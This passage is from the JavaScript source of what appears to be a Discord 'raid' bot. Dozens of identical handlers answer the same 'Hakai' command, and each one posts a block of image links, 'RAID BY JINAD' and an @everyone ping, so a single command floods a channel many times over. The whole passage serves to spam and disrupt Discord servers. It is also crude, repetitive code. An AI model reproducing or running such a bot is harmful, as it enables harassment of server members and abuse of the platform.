        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){ // creates the command /
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }if (message.content === prefix + "Hakai"){ // creates the command /
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }if (message.content === prefix + "Hakai"){ // creates the command /
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }if (message.content === prefix + "Hakai"){ // creates the command /
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }if (message.content === prefix + "Hakai"){ // creates the command /
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    if (message.content === prefix + "Hakai"){
        message.channel.sendMessage("https://cdn.discordapp.com/attachments/467010679811997696/467016550281510917/image.jpg https://professor-falken.com/wp-content/uploads/2016/04/republica-del-congo-pais-emblema-insignia-simbolo-Fondos-de-Pantalla-HD-professor-falken.com_.png https://cdn.shopify.com/s/files/1/0665/4989/products/banane.png?v=1458596631 http://www.gif-maniac.com/gifs/53/53439.gif https://cdn.discordapp.com/attachments/467010679811997696/467016591352004618/image.jpg RAID BY JINAD @everyone");
        console.log("Commande  utilisée !");
    }
    
});


